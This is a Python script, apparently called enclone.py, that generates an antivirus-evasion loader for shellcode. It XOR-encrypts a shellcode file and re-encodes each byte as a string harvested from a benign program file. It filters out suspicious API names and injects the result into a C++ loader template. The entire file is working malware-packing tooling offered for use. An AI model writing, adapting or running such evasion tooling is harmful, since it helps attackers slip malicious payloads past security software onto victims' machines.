import os, re, sys, random, string

def xor_crypt(shellcode, key):
    encrypted = [];
    i = 0
    for x in shellcode:
        encrypted.append(x ^ int(ord(key[i % len(key)])))
        i += 1
    return encrypted

def get_strings(pe_lines, min_length):
    strings = []
    # avoid adding suspicious api call names as strings
    with open("suspicious.txt") as f:
        suspicious_calls = f.readlines()
        pattern = re.compile(r'[a-zA-Z]*') 
        for line in pe_lines:
            for matched_object in pattern.finditer(line):
                if len(matched_object.group()) > min_length:
                    if matched_object.group() not in strings and matched_object.group().lower() not in suspicious_calls:
                        strings.append(matched_object.group())
    return strings

def gen_encoding_table(strings):
    i = 0
    table = "{\n"
    for s in strings:
        table += f"\t\"{s}\", \n"
        if i >= 255:
            break
    table = table[:-2] + "\n}"
    return table

def encode_shellcode(shellcode, strings):
    encoded = "{ "
    for s_byte in shellcode:
        encoded += f"\"{strings[s_byte]}\", "
    encoded = encoded[:-2] + " }"
    return encoded

def main(source_file, shellcode_file):
    shellcode = None
    strings = []
    xor_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
    print(f"[*] Using xor key: {xor_key}")

    with open(shellcode_file, "rb") as f:
        shellcode = f.read()
    
    with open(source_file, encoding='utf-8', errors="ignore") as f:
        min_length = 8
        pe_file_content = f.readlines()
        while len(strings) < 255:
            strings = get_strings(pe_file_content, min_length)
            print(f"[*] Found {len(strings)} strings, searching with a min length of {min_length}...")
            min_length -= 1
            if min_length == 0:
                print("[!] Not enough strings found to create an encoding table :/")
                print(sys.exit(1))
        print("[*] Enough strings found to create encoding table!")
        strings = strings[-256:]

    print("[*] Setting up C++ loader source...")
    with open("loader.cpp") as template_file:
        with open("generated_loader.cpp", "w") as generated_file:
            for line in template_file.readlines():
                replaced = line.replace("REPLACE_ENCODING_TABLE", gen_encoding_table(strings))
                replaced = replaced.replace("REPLACE_SHELLCODE_ARRAY", encode_shellcode(xor_crypt(shellcode, xor_key), strings))
                replaced = replaced.replace("REPLACE_KEY", xor_key)
                generated_file.write(replaced)

    print("[*] Done!")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: enclone.py <PATH_TO_FILE> <PATH_TO_SHELLCODE.BIN>")
        sys.exit(1)

    if not os.path.exists(sys.argv[1]):
        print(f"File {sys.argv[1]} does not exist")
        sys.exit(1)
    if not os.path.exists(sys.argv[2]):
        print(f"File {sys.argv[2]} does not exist")
        sys.exit(1)
    
    main(sys.argv[1], sys.argv[2])